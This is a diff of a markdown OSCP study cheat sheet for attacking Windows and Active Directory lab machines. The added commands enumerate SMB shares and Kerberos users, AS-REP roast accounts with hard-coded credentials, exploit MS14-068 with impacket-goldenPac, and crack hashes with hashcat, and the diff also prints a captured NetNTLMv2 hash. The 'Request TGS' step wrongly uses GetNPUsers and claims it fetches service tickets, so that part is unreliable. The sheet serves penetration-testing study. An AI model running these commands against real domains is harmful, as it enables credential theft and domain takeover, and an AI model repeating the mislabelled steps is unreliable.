@@ -1,5 +1,7 @@
 # OSCP Cheat Sheets Windows
 Preparation for OSCP
+https://www.ired.team/
+
 
 ## RECON
 
@@ -138,29 +140,47 @@ hashcat -m 5600 mssql-svc.netntlmv2 rockyou.txt -o cracked.txt --force
 >go
 ```
 
-#### AD
+### AD
 *** importante sincronisar tiempo con DC "rdate -n 10.10.10.52"
+
+#### Enumerate
 ```Shell
 crackmapexec smb 10.10.10.52 -u 'James' -p 'J@m3s_P@ssW0rd!'  --shares
 ```
 ```Shell
-ldapdomaindump -u "htb\James" -p "J@m3s_P@ssW0rd\!" 10.10.10.52 
-```
-```Shell
+# User enumerate
 nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='htb.local',userdb=/opt/SecLists/Usernames/Names/names.txt 10.10.10.52
 kerbrute userenum --domain htb.local /opt/SecLists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.52 
 ```
 ```Shell
-impacket-GetNPUsers 'htb.local/james:J@m3s_P@ssW0rd!' -dc-ip 10.10.10.52 # Dump the full list of ASP-REP vulnerable users
+ldapdomaindump -u "htb\James" -p "J@m3s_P@ssW0rd\!" 10.10.10.52 
 ```
 
-#MS14-068 - vuln kerberos
+#### Kerberoasting
+1.- Dump in memory
+2.- Request TGS
+
+```Shell
+impacket-GetNPUsers 'htb.local/james:J@m3s_P@ssW0rd!' -dc-ip 10.10.10.52 # Dump the full list of ASP-REP vulnerable users
+```
+#### Request TGS
+```Shell
+impacket-GetNPUsers -request yuncorp.local/jenriquez:P@$$w0rd! # Get TGS to any service
+```
+```Shell
+hashcat -m 13100 -a 0 hash.txt rockyou.txt --force
+```
+
+
+
+#### Kerberos MS14-068
 https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html
 
 https://raw.githubusercontent.com/mubix/pykek/master/ms14-068.py
 ```Shell
 impacket-goldenPac 'htb.local/james:J@m3s_P@ssW0rd!@mantis.htb.local'
 ```
+
 
 #### Shells
 ```Shell
@@ -182,8 +202,9 @@ PS C:\> [Environment]::Is64BitProcess
 ```
 
 #### Crack
-#Pwd NetNTLM
+
 ```Shell
+# Hast NetNTLM
 root@kali:/OSCPv3/htb/Optimum# cat hash 
 kostas::OPTIMUM:4141414141414141:cb75e848816d72f0887c979360a94c8d:01010000000000008049ffc23c08d801d13ac8046c9c0773000000000100100062004f0056006c004c006300560043000200100053005100730044004600540044004f000300100062004f0056006c004c006300560043000400100053005100730044004600540044004f00070008008049ffc23c08d80106000400020000000800300030000000000000000000000000200000427ee1a135839f2e7cdb03560c68c4af3fd234632cc4c0ce7480b21dc9de2fb40a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003200000000000000000000000000
 ```
@@ -311,7 +332,7 @@ https://github.com/bitsadmin/wesng
 ```Shell
 root@kali:/OSCPv3/htb/Optimum# python /opt/wesng/wes.py systeminfo.txt
 root@kali:/OSCPv3/htb/Optimum# python /opt/wesng/wes.py systeminfo.txt -i "Elevation Privilege"
-```
+``` 
 
 #Windows-Exploit-Suggester
 https://github.com/AonCyberLabs/Windows-Exploit-Suggester
